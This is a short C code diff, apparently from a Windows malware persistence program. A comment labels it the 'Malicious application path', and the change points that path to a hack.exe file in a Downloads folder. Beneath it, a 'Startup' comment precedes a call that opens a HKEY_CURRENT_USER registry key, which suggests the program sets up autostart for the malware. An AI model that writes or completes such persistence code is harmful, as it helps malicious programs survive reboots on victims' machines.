@@ -14,7 +14,7 @@ int main (int argc, char * argv[]){
 
     HKEY hkey = NULL;
     // Malicious application path
-    const char* exe = "C:\\Downloads";
+    const char* exe = "C:\\Users\\Administrator\\Downloads\\hack.exe";
     // Startup 
     LONG result = RegOpenKeyEx(
         HKEY_CURRENT_USER,
